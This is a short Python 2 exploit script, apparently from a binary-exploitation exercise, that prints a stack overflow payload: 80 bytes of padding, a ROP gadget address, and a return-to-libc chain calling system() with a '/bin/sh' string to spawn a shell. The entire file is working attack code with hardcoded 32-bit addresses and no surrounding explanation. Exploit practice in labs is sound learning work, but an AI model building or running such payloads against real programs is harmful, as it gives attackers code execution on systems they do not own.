#!/usr/bin/python
import struct
import string

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

#padding = "".join([x*4 for x in string.ascii_uppercase])
"""

Stack looks like:

args
ret addr
syscall
"""

# ROP Gadget pop pop ret
eip = struct.pack("I", 0x08048492)

system = struct.pack("I", 0xb7ecffb0)
ret_after = "AAAA"
# actually just sh
bin_sh = struct.pack("I", 0xb7fb821d)

#shell_code_egg = struct.pack("I", 0xbffffe57)


# EIP is 8 bytes after ROP call
junk = "B"*8


trap = "\xCC"*100

print padding+eip+junk+system+ret_after+bin_sh
